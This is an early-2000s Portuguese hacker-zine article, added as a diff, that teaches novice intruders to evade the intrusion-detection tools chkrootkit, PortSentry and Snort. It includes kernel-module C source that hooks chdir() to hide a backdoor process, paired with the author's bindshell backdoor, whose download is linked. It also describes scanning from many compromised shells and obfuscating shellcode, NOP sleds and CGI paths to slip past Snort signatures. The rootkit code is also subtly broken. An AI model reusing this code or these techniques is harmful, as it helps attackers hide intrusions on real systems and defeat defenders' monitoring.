@@ -1,0 +1,848 @@
+###########################################################################
+########################## UNSEKURITY SCENES ##############################
+###########################################################################
+
+		     *******************************
+                     *     TRUQUES CONTRA IDSs     *
+		     *******************************
+
+			I Parte (Outubro/00)
+
+
+Desenvolvido por Nash Leon vulgo coracaodeleao.
+nashleon@yahoo.com.br
+
+Este e outros artigos podem ser obtidos em:
+http://unsekurity.virtualave.net/ ou
+http://coracaodeleao.virtualave.net/
+
+OBS: O Autor nao se responsabiliza pelo mau uso do material contido neste
+     texto.Todos os dados e exemplos disponibilizados neste texto possuem
+     somente propositos educacionais.
+
+OBS2: Mais um texto onde o publico alvo eh o pessoal NewBie Fucador, se
+      voce eh elite ou se considera 'elite', favor nao ler.
+
+
+------------------------------- INDICE ----------------------------------
+
+1. INTRODUCAO.
+2. TRUQUES CONTRA FERRAMENTAS IDS
+   2.1 - Chkrootkit
+   2.2 - PortSentry
+   2.3 - Snort
+3. TERMINANDO.
+   3.1 - Links e Referencias.
+   3.2 - Consideracoes Finais.
+
+--------------------------------------------------------------------------
+
+--------------
+1. INTRODUCAO |
+--------------
+
+Decidi escrever alguns textos relatando alguns esquemas para serem usados
+em cima de algumas ferramentas usadas para aumentar a 'Seguranca' de um
+sistema e etc.Os esquemas sao simples, alguns sao apenas teorias, outros
+sao formas de se exploitar quando existe uma determinada configuracao de
+uma ferramenta, enfim, sao esquemas simples que serao transmitidos com
+um unico objetivo, que eh 'agucar' a mente de um fucador para que ele
+possa ir obtendo mais conhecimentos sobre como se deve fucar um sistema
+em prol de exploitar o mesmo.
+Este eh mais um txt meu onde o publico alvo eh o pessoal 'NewBie Fucador',
+de modo que nada de extraordinario serah descrito aqui, entao, se voce
+eh elite ou se considera 'elite', eh bom ir parando por aqui mesmo.Em
+especial os kiddies que alteram home pages, pois voces nao conseguiram
+nada de util neste texto e nem em nenhum txt meu!
+
+------------------------------
+2. TRUQUES CONTRA FERRAMENTAS |
+------------------------------
+
+A grande maioria desses programas podem ser encontrados em repositorios,
+mas o que nos interessa eh se a rede alvo possui ele ou nao.Em caso,
+afirmativo, podemos ver se existe condicao de passarmos ou tirarmos
+proveito deles.
+
+2.1 - Chkrootkit
+-----------------
+
+O Chkrootkit, construido por um brasileiro, visa detectar um rootkit
+em um sistema Linux atraves de varios esquemas.Ele eh bastante eficiente
+em rootkits que alteram arquivos binarios como o famoso 'Linux RootKit'.
+Em sua versao atual(0.17), o Chkrootkit implementa uma tecnica p/
+detectar rootkits feitos em LKM.
+
+Os mais conhecidos rootkits hoje disponiveis como o adore, o knark e etc,
+sao facilmente detectados com este 'conceito' usado pelo chkrootkit.A
+tecnica usada pelo chkrootkit se limita a executar um brutal force
+via chdir() nos diretorios /proc/X, sendo X um intervalo de 1 a 65535.
+Como todo processo em execucao no linux cria um diretorio virtual em
+/proc/X, sendo X o seu PID, quando voce esconde um PID, atraves do
+brutal force, ele consegue detectar se um processo estah oculto,
+denunciando assim o seu rootkit em LKM.
+
+A solucao p/ este problema eh bem trivial, pois o programa que executa
+o brutal force se limita ao 'user-space', logo, poderemos interceptar
+o systemcall responsavel pelo chdir() e retornar uma informacao falsa.
+
+O LKM abaixo eh capaz de fazer exatamente isto, e se usado junto com
+a minha backdoor ou as outras backdoors em LKM, o chkrootkit serah
+incapaz de detecta-la, abaixo segue o codigo:
+
+-------------------------- NL_dirproc.c ------------------------------
+
+/* Simples LKM para interceptar chdir().
+   Desenvolvido por Nash Leon vulgo coracaodelao.
+   nashleon@yahoo.com.br
+   http://coracaodeleao.virtualave.net/
+   Este programa segue junto a backdoor Sombria v1.01.
+   LKM testado em kernel 2.2.13.
+
+   OBS: Existe um Tutorial de Programacao Basica p/ Fucadores em
+        Linux(I Parte) feito por mim que ensina o basico sobre LKM.
+        Vai um conselho aos que nao conhecem LKM, se voce tiver executando
+        a Sombria em sua forma original(soh permite 1 conexao bindshell)
+        execute este LKM apenas 1 vez, com o PID definido e depois que
+        entrar na bindshell, derrube este LKM, senao o sistema pode
+        travar.Com o basico de LKM, voce pode inserir os codigos que
+        estao aqui, diretamente em NL_sombria_lkm.c e fazer com que o
+        recebimento do PID seja dinamico e um processo reverso p/ o
+        mesmo.
+
+*/
+
+#define       MODULE
+#define     __KERNEL__
+
+#include <linux/kernel.h>
+#include <asm/unistd.h>
+#include <asm/uaccess.h>
+#include <linux/types.h>
+#include <linux/dirent.h>
+#include <linux/malloc.h>
+#include <linux/stat.h>
+#include <linux/if.h>
+#include <linux/unistd.h>
+#include <sys/syscall.h>
+
+/* Defina aqui o diretorio a ser escondido.
+   Lembrando que eh /proc + PID escondido. */
+
+#define  PID  "/proc/166"
+
+extern void* sys_call_table[];
+int (*original_chdir) (const char *path);
+
+int hacked_chdir(const char *path){
+char *test;
+char *pid = PID;
+
+test = (char *) kmalloc(strlen(pid)+ 2, GFP_KERNEL);
+copy_from_user(test,path,strlen(pid));
+test[strlen(pid)] = '\0';
+
+
+/* Se condicao for verdadeira retorna '-ENOENT' que significa
+   "arquivo ou diretorio nao encontrado. A condicao eh:
+   Se chdir(argumento) = chdir(PID) retorna -ENOENT. */
+
+if (!strcmp(test,pid)){
+kfree(test);
+return -ENOENT;
+}
+}
+/* Funcoes Essenciais. */
+
+int init_module(void){
+printk("<1> Carregando LKM contra chkrootkit...\n");
+original_chdir = sys_call_table[__NR_chdir];
+sys_call_table[__NR_chdir] = hacked_chdir;
+printk("<1> LKM Carregado com sucesso!!\n");
+return 0;
+}
+
+void cleanup_module(void)
+{
+printk("<1> Descarregando LKM..\n");
+sys_call_table[__NR_chdir] = original_chdir;
+printk("<1> LKM Descarregado com Sucesso!!\n");
+}
+------------------------------------------------------------------
+
+Lembrando p/ os mais leigos, cuidado com o syslog!:)
+
+A minha backdoor "Sombria" jah possui este codigo e ela atualmente eh
+indetectavel pelo chkrootkit v0.17.
+
+A 'licao' que eu deixo aqui, eh que eh muito dificil um programa 
+executando no 'user-space' ser realmente eficaz contra um LKM.Mais uma
+vez, um rootkit ou mesmo um sniffer executando via LKM torna uma perigosa
+e poderosa ferramenta na mao de um fucador!
+
+
+2.2 - PortSentry
+-----------------
+
+Mais um item que servirah apenas p/ contemplar e exemplificar um
+conceito de uma tecnica usada por algumas ferramentas de IDS e formas
+de se 'passar' por este conceito.
+
+2.2.1 - A ferramenta
+---------------------
+
+O 'PortSentry' eh uma boa ferramenta IDS que busca proteger uma rede
+contra um 'scaneamento'.O esquema usado por ela eh o seguinte:
+
+Portas de 1 a 20 quando scaneadas 'avisam' rapidamente a ferramenta
+que ela estah sendo alvo de uma investida scan.Se voce sabe que uma
+rede possui o portsentry instalado nela, nao comece nunca 'chutando'
+portas entre este intervalo(1 a 20).As chances de um host que estah
+usando 'portsentry' possuir uma destas portas abertas eh bem minima,
+porem nao impossivel.Analise antes sempre para se certificar se
+realmente vale a pena tentar uma investida em portas neste intervalo.
+
+Varios metodos de scaneamento conhecidos como 'Stealth Scans' tambem 
+sao detectados pelo 'portsentry', abaixo seguem os metodos amplamente
+conhecidos que ele eh capaz de detectar atualmente:
+
+- Strobe-style scans (connect() scans)
+- SYN/Half open scans.
+- FIN scans.
+- NULL scans.
+- XMAS scans.
+- UDP scans 
+
+Todos os metodos mais populares sao facilmente detectados pelo portsentry.
+Logo, deve-se ter juizo ao se usar ferramentas como o 'Nmap do Fiodor'.
+Um texto detalhando varios tipos de scan, inclusive os descritos acima,
+pode ser encontrado em www.insecure.org.Existe um txt antigo do c0nd0r
+da sekure.org em portugues, mas nao conheco link para o mesmo.
+
+
+As opcoes de 'defesa' provida pelo 'portsentry' nos deixa numa situacao
+bastante 'incomoda'.Abaixo podemos ve-las retiradas do arquivo 
+'portsentry.conf' e sua forma na instalacao padrao:
+
+# 0 = Do not block UDP/TCP scans.
+# 1 = Block UDP/TCP scans.
+# 2 = Run external command only (KILL_RUN_CMD)
+
+BLOCK_UDP="1"
+BLOCK_TCP="1"
+
+Se a opcao '2' estiver setada, um comando serah executado, muito
+provavelmente a 'queda' do daemon.Por isso, deve-se ter a atencao redobrada
+quanto a este problema.Se o daemon 'cair', pode esperar algum tempo e ateh 
+mesmo alguns dias p/ investir em uma exploitacao ao alvo.
+Por sorte, a maioria dos administradores nao ativam esta opcao, o que
+nos dah maiores chances de obtencao de exito.
+
+Uma opcao interessante eh o pricipal motivo deste txt, ou seja, o
+portsentry costuma bloquear os pacotes vindos de um determinado IP quando
+este IP estah tentando scanear a rede 'protegida' pelo portsentry.
+Existem duas opcoes disponiveis que podemos ver no arquivo
+'portsentry.conf', sao elas:
+
+###############
+# TCP Wrappers#
+###############
+KILL_HOSTS_DENY="ALL: $TARGET$"
+
+Que fechar o acesso ao sistema para o IP '$TARGET$' via TCP Wrappers, e:
+
+###################
+# Dropping Routes:#
+###################
+
+# Generic Linux
+#KILL_ROUTE="/sbin/route add -host $TARGET$ gw 333.444.555.666"
+
+Que literalmente derruba 'rotas' e adiciona um host numa tabela de filtros
+locais.
+
+Em qualquer um dos dois metodos, podemos visualizar que iremos ter
+problemas, se e "somente se" permanecermos com o mesmo IP.
+
+
+2.2.2 - Detectando Portsentry
+------------------------------
+
+Detectar o portsentry pode ser uma tarefa 'meio' dificil.Eh mais facil
+trabalharmos com o conceito de detectar uma ferramenta IDS - Anti-probe
+do que uma versao propriamente dita de um IDS.Mas a pratica nos mostra
+algumas coisas que podem de alguma forma nos ajudar na deteccao desta
+ferramenta.
+
+De ante-mao, ela eh apenas uma ferramenta Anti-Scan, ou seja, ela nao
+eh um IDS completo, que procura filtrar e se precaver das outras tecnicas
+fucadoras existentes.
+
+Vejamos abaixo como esta ferramenta reage numa tentativa de scaneamento
+usando o famoso 'nmap':
+
+localhost:/usr/local/psionic/portsentry# ./portsentry
+Psionic PortSentry - Port Scan Detector.
+Copyright 1997,98 Craig H. Rowland <crowland@psionic.com>
+Licensing restrictions apply. Please see documentation
+Version: 1.0
+
+usage: portsentry [-tcp -udp -stcp -atcp -sudp -audp]
+
+*** PLEASE READ THE DOCS BEFORE USING ***
+
+localhost:/usr/local/psionic/portsentry# ./portsentry -atcp
+localhost:/usr/local/psionic/portsentry# ./portsentry -stcp
+localhost:/usr/local/psionic/portsentry# ./portsentry -tcp
+
+Carregamos ele para se defender em tres modos, inclusive de scanners
+'avancados' em TCP.
+
+Agora no NMAP:
+
+localhost:/nmap-2.3BETA4# nmap -sF -O localhost > local.log
+
+Depois analisamos o arquivo local.log:
+
+Starting nmap V. 2.54BETA1 by fyodor@insecure.org ( www.insecure.org/nmap/
+)
+Interesting ports on localhost (127.0.0.1):
+(The 1487 ports scanned but not shown below are in state: closed)
+Port       State       Service
+1/tcp      open        tcpmux
+7/tcp      open        echo
+9/tcp      open        discard
+11/tcp     open        systat
+15/tcp     open        netstat
+21/tcp     open        ftp
+23/tcp     open        telnet
+37/tcp     open        time
+70/tcp     open        gopher
+79/tcp     open        finger
+80/tcp     open        http
+109/tcp    open        pop-2
+110/tcp    open        pop-3
+111/tcp    open        sunrpc
+119/tcp    open        nntp
+138/tcp    open        netbios-dgm
+139/tcp    open        netbios-ssn
+143/tcp    open        imap2
+512/tcp    open        exec
+513/tcp    open        login
+514/tcp    open        shell
+515/tcp    open        printer
+540/tcp    open        uucp
+635/tcp    open        unknown
+1080/tcp   open        socks
+1524/tcp   open        ingreslock
+2000/tcp   open        callbook
+2001/tcp   open        dc
+6000/tcp   open        X11
+6001/tcp   open        X11:1
+6667/tcp   open        irc
+12345/tcp  open        NetBus
+12346/tcp  open        NetBus
+31337/tcp  open        Elite
+32771/tcp  open        sometimes-rpc5
+32772/tcp  open        sometimes-rpc7
+32773/tcp  open        sometimes-rpc9
+32774/tcp  open        sometimes-rpc11
+
+TCP Sequence Prediction: Class=random positive increments
+                         Difficulty=2170631 (Good luck!)
+Remote operating system guess: Linux 2.1.122 - 2.2.14
+
+Nmap run completed -- 1 IP address (1 host up) scanned in 16 seconds
+
+
+Bom.. No teste soh existiram 6 portas abertas, mas o bloqueio feito
+pelo portsentry levou o nmap a 'pensar' que todas as portas estao
+abertas.Isso em determinados casos representa uma consideravel perda de
+tempo.Pois nao tem como de fato sabermos quais portas estao abertas e
+quais estao fechadas.Outro problema reside nos logs gerados, ou seja,
+seu IP atual estah logado e ateh mesmo 'banido' de acesso no sistema
+alvo.Se for ver o sistema de logs, poderah ver algumas coisas do tipo:
+
+Em /var/log/messages:
+
+Sep 13 06:58:33 localhost portsentry[467]: attackalert: Host 127.0.0.1 has
+been blocked via dropped route using command: "/sbin/route add -host 127.0.0.1 
+gw 333.444.555.666"
+
+Sep 13 06:58:33 localhost portsentry[467]: attackalert: FIN scan from host:
+localhost/127.0.0.1 to TCP port: 26
+
+Em portsentry.blocked.atcp:
+
+968839113 - 09/13/2000 06:58:33 Host: localhost/127.0.0.1 Port: 185 TCP
+Blocked
+
+E pode-se ter informacoes em portsentry.history, nos arquivos de um
+TCP Wrapper, e em arquivos de configuracoes especificas de log.
+
+De qualquer forma a rede jah detectou sua tentativa.Voce possui agora
+duas opcoes.. Tentar ou Desistir!
+
+2.2.3 - Eu Tentaria
+--------------------
+
+Digamos que voce seja audacioso e que a partir de entao estah mais
+determinado do que nunca a 'acessar' esta rede.Ao que tudo indica, eh
+uma rede protegida, que possuia boas ferramentas de seguranca e muito
+provavelmente um bom administrador.
+
+A teoria basica para se scanear este sistema eh a da 'forca bruta'.
+O portsentry permite conexoes as portas, ele barra apenas scaneamento
+quando detecta um, ou seja, as opcoes surgem quando tentamos nao
+alertar o portsentry de forma direta como fizemos acima usando o nmap
+diretamente.Poderiamos fazer o seguinte:
+
+# telnet localhost 21
+Trying 127.0.0.1...
+Connected to localhost.
+Escape character is '^]'.
+220 localhost FTP server (Version wu-2.6.0(1) Fri Oct 22 00:38:20 CDT
+1999) ready.
+
+1 Tentativa.
+
+# telnet localhost 513
+Trying 127.0.0.1...
+Connected to localhost.
+Escape character is '^]'.
+
+2 Tentativas.
+
+# telnet localhost 514
+Trying 127.0.0.1...
+Connected to localhost.
+Escape character is '^]'.
+Connection closed by foreign host.
+
+3 Tentativas e nada do dito cujo bloquear.
+
+# telnet localhost 37
+Trying 127.0.0.1...
+Connected to localhost.
+Escape character is '^]'.
+½iOpConnection closed by foreign host.
+
+4 Tentativas.
+
+# telnet localhost 1
+Trying 127.0.0.1...
+Connected to localhost.
+Escape character is '^]'.
+** MANO - USE UMA TATICA MAIS AVANCADA! *** ESSES SCANNER SAO FACEIS DE
+LOGAR..
+CUIDADO. NASH LEON.Connection closed by foreign host.
+
+5 Tentativas, e apenas na quinta tentativa ele respondeu com uma mensagem
+de Banner... Se voce vir esta mensagem por aih, nao se preocupe, eh o meu
+portsentry..:)
+
+Foram necessaria cinco tentativas para que ele realmente detectasse que
+esta sendo atacado.Dependendo do admin, isto pode ser diminuido, mas
+sempre vai existir uma condicao de pelo menos 2 portas abertas.O IP foi
+logado, poderiamos desconectar e voltar com um novo IP e tentarmos
+em mais portas.
+
+Mas existe um detalhe ainda maior, que jah foi dito antes, portas menores
+de 20 soh basta 1 tentativa e jah era! Por isso, evite scanear essas
+portas, e se for usar o nmap, selecione portas melhores que estas.Uma
+rede com 'systat' aberto eh uma boa, mas na maioria dos casos nao eh
+de bom proveito, pois com o proprio scaneamento voce obtem as informacoes
+que o systat pode estar provendo.
+
+Eh obvio que existe um esquema que agiliza isso tudo.Eh uma tecnica
+mundialmente conhecida e que eh capaz de scanear toda e qualquer rede
+localizada na internet.Ela eh ruidosa e ao mesmo tempo pode deixar
+rastros, mas eh uma tecnica bastante eficiente em busca de se 'quebrar'
+essas ferramentas IDS.Consiste em Multiplos IPs, scaneamento atraves
+de Multiplos IPs. Sabemos que o 'portsentry' vai fechar apos X tentativas,
+se nos possuimos vinte shells mundo a fora, poderemos usar essas 20
+shells(se algum membro da seguranca acha que eh muito, vah logo sabendo
+que conheco pessoas que tem centenas!!!) para tentar uma investida em
+conjunto e nos fornecer informacoes 'reais' sobre a rede alvo.No nosso
+exemplo, poderiamos usar 5 tentativas desde que nao fosse em determinadas
+portas que soh permitem 1 conexao(veja na marra).
+
+A 'licao' que eu deixo aqui, eh que ferramenta como 'portsentry' sao
+ineficazes quando o fucador estah realmente disposto! Se uma rede
+alvo eh muito cobicada, pode-se levar meses p/ que um fucador de fato
+possua conhecimentos plenos a respeito de quais servicos estao sendo
+executados nela, mas se o fucador estiver mesmo disposto, o portsentry
+serah uma ferramenta completamente ineficaz!
+
+2.3 - Snort
+------------
+
+O conceito usado por ele eh mais abrangente do que o do portsentry, e ele 
+nao soh procura defender a rede de scaneamentos, mas tambem contra 
+exploitacoes diversas.Ele funciona como uma especie de 'sniffer',escutando na
+interface da rede e checando os pacotes que estao chegando por ela.Eh um 
+verdadeiro canivete suico e eh uma ferramenta que 'depende' muito do 
+administrador da rede, ou seja, se o administrador manja de hacking a coisa 
+fica dificil, se ele nao manja, acho que nao preciso nem dizer nada.
+
+Trabalhando com a hipotese do administrador nao 'pensar' e nem 'agir' como 
+um fucador, ele entao serah mecanico! E irah criar as regras apenas para 
+exploits que jah foram publicados e p/ tecnicas amplamente difundidas.
+E aih que entra a 'malicia' de um fucador, que irah procurar 'visualizar'
+as regras que o administrador disponibilizou em sua ferramenta 'snort'.
+
+
+Mas vamos lah.. O snort estah escutando na interface, antes de chegar no
+daemon, os dados passam pelo snort, entao devemos contemplar esquemas
+eficazes para poder atingir algum daemon em cheio, passando pelo snort.
+
+A Sintaxe usada pelo snort para a criacao de regras eh a seguinte:
+
+<funcao> <protocolo> <ip_origem/mask> <intervalo_porta_origem> ->
+<ip_destino> <intervalo_porta_destino> <opcoes>
+
+OBS: Isso tudo em uma linha soh!
+
+Sendo algumas das opcoes validas:
+msg => Mensagem de saida p/ os arquivo de log/alerta.
+logto => Arquivo para logar alertas especificos.
+content => Esta opcao le o conteudo a procura de
+overflows e exploitacao.
+
+Um exemplo basico seria:
+
+
+alert tcp any any -> any 21 (msg:"Atras de Format Bug";content:"site exec %p";)
+
+Ou seja.. Se alguem der um telnet p/ a 21 e enviar 'site exec %p' o sistema 
+irah detectar e logar uma tentativa de exploitacao.Como ela eh uma ferramenta 
+flexivel, em que o administrador fornece regras a vontade, ela se torna um 
+desafio, pois se o administrador da rede eh competente, ele saberah quais 
+comandos filtrar e como responder caso alguem tente exploitar o sistema dele.
+No lugar de 'site exec %p', poderiamos colocar simplesmente '%', isso serve p/ 
+visualizarmos as dificuldades que esta ferramenta poderah nos fornecer.
+
+Esta eh sem duvida uma ferramenta muito interessante p/ fucadores, pois
+ele serve p/ demonstrar na pratica a 'criatividade' e a eficiencia da tecnica 
+fucadora mais conhecida e amplamente difundida em todo o mundo, 
+a 'tecnica da MALICIA'!:).Veremos algo nesse sentido mais abaixo.
+
+
+Criando um arquivo basico de regras, com varias regras p/ detectar uma 
+tentiva de exploitacao, poderiamos executar o 'snort' do seguinte modo
+(para podermos contemplar mais esquemas):
+
+# snort -D -A full -i lo -c regras.snort
+
+Onde a interface a ser escutada no caso eh a 'lo', o arquivo com regras
+definidas por nos eh o 'regras.snort', executando em modo Daemon(D) e
+gerando logs de alerta (A) completos em '/var/log/snort.alert'.Se o nosso 
+arquivo de regras tivesse aquela linha inicial, nos poderiamos ter o seguinte 
+log em /var/log/snort.alert:
+
+[**] Atras de Format Bug [**]
+09/21-09:47:08.027151 127.0.0.1:1042 -> 127.0.0.1:21
+TCP TTL:64 TOS:0x10 ID:305  DF
+*****PA* Seq: 0xF0866349   Ack: 0xF01FD1CC   Win: 0x3CB0
+TCP Options => NOP NOP TS: 290004 289437
+
+
+Ou seja, eh aquilo que haviamos definido na regra p/ ser executada.Se
+um 'shell script' age em conjunto com isso e nos dah uma resposta rapida e 
+eficaz de protecao ao sistemas, as nossas chances frente ao sistema alvo vao 
+diminuindo cada vez mais.Digamos que o admin rode um shell script a cada 3 
+minutos, e nesse shell script, ele captura entradas do arquivo 
+'/var/log/snort.alert' e consequentemente se defende de um invasor ou de um 
+possivel invasor futuro.Em todo o caso, o melhor eh evitar a geracao de 
+alerta e 'passar' por esta ferramenta.
+
+Como vimos, a principal vantagem dela eh 'filtrar' o conteudo dos dados
+que estao chegando na rede e analisar com um 'banco de dados' criado pelo 
+administrador p/ defender a rede contra exploitacoes.O arquivo 'overflow-lib',
+traz alguns exemplos de regras que sao usadas p/ proteger a rede contra 
+ataques bem conhecidos de 'buffer overflows', vejamos:
+
+--------------------- overflow-lib ------------------------
+# $Id: overflow-lib,v 1.3 2000/01/15 11:46:25 fyodor
+Exp $
+# Buffer overflows go here!
+
+# IMAP buffer overflow
+# IMAP buffer overflow
+alert tcp any any -> $HOME_NET 143 (msg:"IMAP Buffer Overflow!";
+                           content:"|E8 C0FF FFFF|";
+flags: PA;)
+
+# x86 named buffer overflow
+alert tcp any any -> $HOME_NET 53 (msg:"named Buffer Overflow!";
+content:"|CD80 E8D7 FFFF FF|"; flags: PA;)
+
+
+# New buffer overflows submitted by Martin Markgraf alert tcp any any -> 
+          $HOME_NET 110 (msg:"QPOP Buffer Overflow!";
+                            content:"|E8 D9FF FFFF|"; flags: PA;)
+alert tcp any any -> $HOME_NET 21 (msg:"FTP Buffer Overflow-1!";
+                           content:"|5057 440A 2F69|"; flags: PA;)
+alert tcp any any -> $HOME_NET 21 (msg:"FTP Buffer Overflow-2!";
+                           content:"|5858 5858 582F|"; flags: PA;)
+
+
+# New BOF from CyberPsychotic, this one detects Duke's wu-ftpd attack
+alert tcp any any -> $HOME_NET 21 (msg:"FTP buffer overflow1!";
+                                      content:"|5057 440A 2F69|";)
+
+-------------------------------------------------------------
+
+O que nos interessa, eh que o snort vai procurar o conteudo descrito nessas 
+regras nos pacotes que chegam na rede, logo, uma rede com snort tem uma 
+chance consideravel de estar precavida contra os principais exploits 
+publicados hoje em dia.
+
+Analisando outro arquivo de exemplos de regras, o 'RULES.SAMPLE', podemos 
+ver algumas coisas interessantes:
+
+
+----------------------- RULES.SAMPLE ------------------------
+
+# This rule will find SYN FIN scans
+
+alert tcp any any -> 192.168.1.0/24 any (msg:"SYN-FIN scan!"; flags: SF;)
+
+# This one will find TCP NULL scans
+
+alert tcp any any -> 192.168.1.0/24 any (msg:"Null scan!"; flags: 0;)
+
+# This one will find Queso OS fingerprinting attempts
+# You can watch the reserved bits in the flag field of TCP packets.  This
+# allows you to detect things like Queso scans.  The new bits are specified
+# with a "1" and "2".  See the TCP example above for usage.
+
+alert tcp any any -> 192.168.1.0/24 any (msg:"Queso fingerprint";flags: S12;)
+
+
+
+[CORACAODELEAO] => NOS EXEMPLOS ACIMA, VEMOS O SNORT LOGAR ALGUNS
+                   DOS PRINCIPAIS METODOS DE SCANEAMENTO.
+
+
+
+# Here is an example of content based alerting
+
+alert tcp any any -> 192.168.1.0/24 143 (msg:"IMAP Buffer overflow!";
+                                  content:"|90E8 C0FF FFFF|/bin/sh";)
+
+
+
+[CORACAODELEAO] => ACIMA VEMOS ELE DETECTANDO TENTATIVA DE OVERFLOW
+                   NUM SERVIDOR IMAP, ATRAVES DO CONTEUDO.
+
+
+# here's an example of PHF attack detection where just
+a straight text
+# string is searched for in the app layer
+
+alert tcp any any -> 192.168.1.0/24 80 (msg:"PHF attempt"; content: "/cgi-bin/phf";)
+
+
+[CORACAODELEAO] => ACIMA NOS TEMOS ELE DETECTANDO UMA TENTATIVA DE
+                   EXPLOITACAO VIA CGI.
+
+
+
+#################
+# NEW FEATURE: multiple "content" strings per rule
+#################
+# You can now put multiple content keywords in a single rule specification,
+# which enables searching for multiple patterns per packet payload.  This
+# can be used to increase the graularity and accuracy of the packet payload
+# matching rules.  For example, you can now search for a buffer overflow's
+# NOP codes, as well as the "exec" opcodes:
+
+
+alert tcp any any -> $HOME_NET 143 (content:"|9090 9090 9090 9090|";
+             content:"|E8 C0FF FFFF|"; msg:"IMAP Buffer Overflow!";)
+
+
+
+[CORACAODELEAO] => ESTA REGRA EH BASTANTE INTERESSANTE.ELA CAPTURA
+                   NOP'S(0x90).PROCURANDO DESTA FORMA, BARRAR UMA
+                   EXPLOITACAO REMOTA.
+
+
+---------------------------------------------------------------------
+
+
+Como podemos ver, as regras sao flexiveis, e dependendo do administrador
+da rede, as coisas podem ser muito dificeis.Em uma rede que se preze pela 
+seguranca, ferramentas como esta estao cada vez mais ocupando espaco, por 
+isso, existe essa necessidade de nao soh teorizarmos tecnicas p/ se passar 
+por elas, mas tambem procurarmos atacar diretamente o conceito usado por elas.
+
+
+No entanto me limitarei neste texto a demonstrar formas basicas de tentar 
+exploitar um sistema com o 'snort' em execucao e nao gerar os logs no mesmo, 
+levando em consideracao que o administrador da rede nao conhece as principais 
+tecnicas fucadoras(XX%) e se limita a definir regras jah amplamente difundidas.
+
+
++ Caso 1 - (content:"|E8 C0FF FFFF|"; flags: PA;)
+
+No caso descrito p/ proteger contra exploits do IMAP foi citado a protecao 
+contra dados binarios(entre '|' - pipe symbol), mais precisamente a filtragem 
+de alguns hexadecimais.O que temos que fazer nesse caso eh criarmos um exploit 
+nosso mesmo, diminuindo consideravelmente as chances do 'snort' conhecer a 
+sequencia de nossos shellcode em termos de hexa.
+
+
++ Caso 2 - (content:"|90E8 C0FF FFFF|/bin/sh";)
+
+Neste caso, podemos contemplar que a string '/bin/sh' enviada em um shellcode 
+iria ser detectada pelo snort e consequentemente o sistema seria alertado de 
+uma tentativa de exploitacao remota.A grande maioria dos exploits envia a 
+string '/bin/sh' inserida no shellcode de forma limpa, sendo facilmente 
+detectada via esta regra.Uma forma de passarmos por isto eh 'criptografando' 
+nosso shellcode, mais precisamente a string '/bin/sh' ou qualquer comando
+desejado.Informacoes sobre shellcode encriptado podem ser obtidas em:
+
+http://coracaodeleao.virtualave.net/artigos/detonastrings.txt
+e
+http://coracaodeleao.virtualave.net/textos/shellcII.txt
+
+O exploit p/ WU-FTPD do duke, bem como diversos outros exploits jah publicados 
+mundo a fora, possuem esta tecnica.Fica evidenciado aqui, mais uma vez, a 
+necessidade de se aprender a codar exploits e shellcodes.
+
+
++ Caso 3 - (msg:"SYN-FIN scan!"; flags: SF;)
+           (msg:"Null scan!"; flags: 0;)
+           (msg:"Queso fingerprint";flags: S12;)
+
+Particularmente, eu nao recomendo o uso destas tecnicas de scaneamento.
+Acredito que um scanemanto usando 'Multiples IPs' em shells remotas deem 
+resultados mais agradaveis e geram menos 'alertas'.A propria captura de um 
+banner pode ser bem mais interessante do que a execucao de um fingerprint em
+muitos casos onde a rede alvo, eh uma rede que 'se diz segura'.
+
+
++ Caso 4 - (content:"|9090 9090 9090 9090|")
+
+Este caso eh bastante interessante.Ele procura detectar uma tentativa
+de buffer overflow via captura de NOPs(0x90) no trafego de recebimento
+da rede.A grande maioria dos exploits usam NOPs p/ agilizar e tornar
+viavel uma exploitacao via buffer overflow.Uma tecnica usada p/ passar
+por esta regra do snort, consiste em substituir o envio de instrucoes
+NOPs em um exploit por outras que produzam o mesmo resultado.Um texto 
+descrevendo pormenores p/ se criar um exploit substituindo a instrucao NOP 
+por 'jmp 0x02' pode ser encontrado em:
+
+http://packetstorm.securify.com/groups/r00tabega/stealthcode.txt
+
+
++ Caso 5 - (content: "/cgi-bin/phf";)
+
+Bastante interessante esta opcao.Ela procura detectar uma tentativa de
+exploitacao remota via bug em CGIs(phf).Quem mexe com seguranca em scripts 
+CGIs jah pode ir contemplando possiveis esquemas p/ se passar por isto.Em 
+alguns sistemas(serah todos??) nos podemos fazer a mesma requisicao acima do 
+seguinte modo: //cgi-bin//phf ; O sistema alvo deverah entender a requisicao 
+como verdadeira, mas o snort nao serah capaz de loga-la, pois nao eh a mesma 
+string que ele estah a espera.
+Do mesmo modo, podemos em shellcodes(comprovado apenas no slack 7.0) usar o
+esquema(..//..//..//..//..//..//..//..//..//..//..//) para quebrar chroot() 
+sem alertarmos o sistema alvo.
+
+O que fica evidenciado com estes exemplos eh a necessidade do fucador saber 
+programar e conhecer todos os possiveis esquemas, fucando direto em busca de
+descobrir coisas novas sobre como quebrar essas ferramentas de seguranca.
+Existem mais esquemas e possibilidades de nao ser metodico, pois o 
+administrador da rede estarah com toda certeza a espera das tecnicas e 
+esquemas amplamente conhecidos.
+
+Isto eh o basico sobre o 'snort', cabe a cada um de nos buscar meios
+mais eficazes e de certo modo 'exclusivos' contra esta 'poderosa'
+ferramenta.Se pudermos ter uma ideia de como 'pensa' o adminitrador
+da rede alvo, poderemos de fato o 'surpreender', mas para isso, devemos
+investir em obtermos conhecimento de todos os possiveis esquemas que podem
+ser usados contra essas ferramentas.
+
+--------------
+3. TERMINANDO |
+--------------
+ 
+Estude, pratique e conheca!!! Vah mais alem dessas linhas e procure
+contemplar maiores esquemas! Compartilhe tambem o que vc sabe e se obter
+seus objetos nao 'se vanglorie'! Podemos ver que essas ferramentas apenas
+aumentam a seguranca de uma rede, e eh possivel passar por elas! Lembre-se
+sempre que do outro lado existe um cerebro tao capacitado ou ateh mesmo
+mais capacitado do que o seu! Nunca subestime a inteligencia de um
+administrador e muito cuidado na implementacao dessas tecnicas, lembre-se:
+"VOCE IRAH SE EXPOR!"
+
+
+3.1 - Links e Referencias
+--------------------------
+
+* Sobre as Ferramentas IDS:
+
+http://packetstorm.securify.com/UNIX/audit/chkrootkit-0.17.tar.gz
+http://www.snort.org/Files/snort-1.6.3.tar.gz
+http://www.psionic.com/tools/portsentry-1.0.tar.gz
+
+* Sombria Backdoor versao 1.0:
+
+http://coracaodeleao.virtualave.net/private/sombria.1.0.tar.gz
+
+* Home Page Atual do Unsekurity Team:
+
+http://unsekurity.virtualave.net/
+
+* Outros Links Interessantes:
+
+http://www.taldowin.com.br/
+http://www.hacker.com.br/
+http://www.absoluta.org/
+http://www.securenet.com.br/
+http://coracaodeleao.virtualave.net/
+
+
+3.2 - Consideracoes Finais
